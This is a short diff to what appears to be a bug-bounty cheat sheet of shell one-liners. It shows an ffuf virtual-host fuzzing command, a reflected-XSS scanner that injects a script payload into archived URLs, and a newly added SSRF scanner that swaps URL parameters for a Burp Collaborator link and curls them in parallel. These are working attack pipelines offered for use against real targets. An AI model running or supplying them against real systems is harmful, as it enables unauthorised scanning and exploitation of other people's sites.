@@ -100,4 +100,10 @@ ffuf -c -u https://target .com -H "Host: FUZZ" -w vhost_wordlist.txt
 waybackurls target.com| grep '=' |qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m" Vulnerable;done
 ```
 
+**SSRF**
+
+```
+cat wayback.txt | gf ssrf | sort -u |anew | httpx | qsreplace 'burpcollaborator_link' | xargs -I % -P 25 sh -c 'curl -ks "%" 2>&1 | grep "compute.internal" && echo "SSRF VULN! %"'
+```
+
 **More Scripts Coming Sooon.....**
